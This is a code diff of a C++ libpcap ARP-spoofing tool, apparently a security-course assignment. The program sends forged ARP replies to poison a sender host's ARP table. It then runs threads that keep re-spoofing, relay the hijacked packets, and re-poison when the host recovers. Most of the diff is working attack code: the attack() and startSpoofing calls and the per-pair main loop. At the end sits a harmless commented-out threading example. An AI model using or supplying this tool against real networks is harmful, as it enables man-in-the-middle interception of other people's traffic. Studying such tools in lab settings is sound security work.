@@ -2,7 +2,6 @@
 #include <pcap.h>
 #include <iostream>
 #include <thread>
-#include <set>
 #include <map>
 #include <vector>
 #include "ethhdr.h"
@@ -95,7 +94,7 @@ void attack(pcap_t* pcap, string sender_mac, string target_mac, char* sender_ip,
 {
 	EthArpPacket packet;
 	attackArpTable(pcap, packet, sender_mac, sender_ip, target_ip, myMac);		
-	attackArpTable(pcap, packet, target_mac, target_ip, sender_ip, myMac);
+	//attackArpTable(pcap, packet, target_mac, target_ip, sender_ip, myMac);
 }
 
 
@@ -215,19 +214,9 @@ int detectedArp(char* dev, string sender_mac, string target_mac, char* sender_ip
 	return 0;
 }
 
-string get_mac_cached(pcap_t* pcap, EthArpPacket pk, char* ip, const string& myMac, const string& myIp, map<string,string>& cache)
-{
-	string key = ip;
-	auto it = cache.find(key);
-	if (it != cache.end()) return it->second;
-    string mac = reqArp(pcap, pk, ip, myMac, myIp);
-    if (!mac.empty()) cache[key] = mac;
-    return mac;
-}
-
 int main(int argc, char* argv[]) 
 {
-	if (argc < 3) 
+	if (argc < 4) 
 	{
 		usage();
 		return EXIT_FAILURE;
@@ -235,11 +224,8 @@ int main(int argc, char* argv[])
 	
 	char* dev = argv[1];
 	char errbuf[PCAP_ERRBUF_SIZE];
-	set<string> IpChk;
-	map<string, string> IpMac;
-	vector<thread> targetNumber;
-	std::vector<pcap_t*> pcaps;
-	pcap_t* pcap = pcap_open_live(dev, SPOOFING_PCAP_BUF_SIZE, 1, 1, errbuf);
+	
+	pcap_t* pcap = pcap_open_live(dev, SPOOFING_PCAP_BUF_SIZE, 1, 1000, errbuf);
 	if (pcap == nullptr) 
 	{
 		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
@@ -248,37 +234,78 @@ int main(int argc, char* argv[])
 	
 	string myIp = getMyIp(dev);
 	string myMac = getMyMac(dev);
-
-	EthArpPacket packet;
 	
+	map<string, string> itom;
+	vector<thread> threads;
+	
+	EthArpPacket packet;
+
 	for (int i = 0; i < (argc - 2) / 2; i++) 
 	{
 		char* sender_ip = argv[i * 2 + 2];
         char* target_ip = argv[i * 2 + 3];
-		string pair_key = string(sender_ip) + "|" + string(target_ip);
-        if (!IpChk.insert(pair_key).second) continue;
 		
-		string sender_mac = get_mac_cached(pcap, packet, sender_ip, myMac, myIp, IpMac);
-		if (sender_mac.empty()) continue;
-		cout << "sender_mac :: " << sender_mac << endl;
-		string target_mac = get_mac_cached(pcap, packet, target_ip, myMac, myIp, IpMac);
-		if (target_mac.empty()) continue;
-		cout << "target_mac :: " << target_mac << endl;
-		
-		char errL[PCAP_ERRBUF_SIZE]{};
-		pcap_t* pcap_pair = pcap_open_live(dev, SPOOFING_PCAP_BUF_SIZE, 1, 1, errL);
-		if (!pcap_pair) continue;
-		pcaps.push_back(pcap_pair);
+        string sender_mac;
+        if (itom.count(sender_ip)) {
+            sender_mac = itom[sender_ip];
+        } else {
+            sender_mac = reqArp(pcap, packet, sender_ip, myMac, myIp);
+            if (!sender_mac.empty()) {
+                itom[sender_ip] = sender_mac;
+            }
+        }
+        if (sender_mac.empty()) continue;
+        cout << "sender_mac :: " << sender_mac << endl;
+        string target_mac;
+        if (itom.count(target_ip)) {
+            target_mac = itom[target_ip];
+        } else {
+            target_mac = reqArp(pcap, packet, target_ip, myMac, myIp);
+            if (!target_mac.empty()) {
+                itom[target_ip] = target_mac;
+            }
+        }
+        if (target_mac.empty()) continue;
+        cout << "target_mac :: " << target_mac << endl;
 
+		attack(pcap, sender_mac, target_mac, sender_ip, target_ip, myMac);
 		
-		attack(pcap_pair, sender_mac, target_mac, sender_ip, target_ip, myMac);
-		
-		targetNumber.emplace_back(startSpoofing, pcap_pair, sender_mac, sender_ip, target_ip, myMac, target_mac);
-		targetNumber.emplace_back(detectedArp,  dev, sender_mac, target_mac, sender_ip, target_ip, myMac);
-		//t1.join();
-		//t2.join();
+		threads.emplace_back(startSpoofing, pcap, sender_mac, sender_ip, target_ip, myMac, target_mac);
+		threads.emplace_back(detectedArp,  dev, sender_mac, target_mac, sender_ip, target_ip, myMac);
 	}
-	for (auto& t : targetNumber) t.join();
-	for (auto* h : pcaps) pcap_close(h);
+
+	for (auto& t : threads) {
+        t.join();
+    }
+
 	pcap_close(pcap);
 }
+
+/*
+#include <iostream>
+#include <thread>
+#include <vector>
+
+void worker(int id) {
+    std::cout << "Thread " << id << " is working." << std::endl;
+    std::this_thread::sleep_for(std::chrono::seconds(1));
+    std::cout << "Thread " << id << " is done." << std::endl;
+}
+
+int main() {
+    const int numThreads = 3;
+    std::vector<std::thread> threads;
+
+    // 여러 스레드 생성
+    for (int i = 0; i < numThreads; ++i) {
+        threads.emplace_back(worker, i);
+    }
+
+    // 모든 스레드 join
+    for (auto& t : threads) {
+        t.join();
+    }
+
+    std::cout << "All threads are done." << std::endl;
+    return 0;
+*/
